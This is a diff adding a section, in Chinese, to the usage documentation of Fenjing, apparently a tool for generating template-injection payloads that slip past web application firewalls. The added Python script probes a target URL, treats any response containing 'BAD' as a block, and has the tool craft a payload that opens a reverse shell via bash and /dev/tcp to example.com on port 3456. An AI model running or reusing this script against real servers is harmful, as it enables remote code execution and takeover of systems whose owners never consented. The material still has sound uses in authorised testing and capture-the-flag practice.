@@ -81,6 +81,38 @@ if __name__ == "__main__":
     # print(f"{config_payload=}")
 ```
 
+### 在不获取WAF黑名单的情况下，根据返回页面中的特征生成payload
+
+比如说如果提交的payload被WAF后，WAF页面含有"BAD"这三个字母，那么可以这么写：
+
+```python
+import functools
+import time
+import requests
+from fenjing import exec_cmd_payload
+
+
+URL = "http://10.137.0.28:5000"
+
+
+@functools.lru_cache(1000)
+def waf(payload: str):  # 如果字符串s可以通过waf则返回True, 否则返回False
+    time.sleep(0.02) # 防止请求发送过多
+    resp = requests.get(URL, timeout=10, params={"name": payload})
+    return "BAD" not in resp.text
+
+
+if __name__ == "__main__":
+    shell_payload, will_print = exec_cmd_payload(
+        waf, 'bash -c "bash -i >& /dev/tcp/example.com/3456 0>&1"'
+    )
+    if not will_print:
+        print("这个payload不会产生回显！")
+
+    print(f"{shell_payload=}")
+```
+
+
 ### 让生成器学会使用新的变量
 
 [参考](https://github.com/Marven11/Fenjing/issues/4)
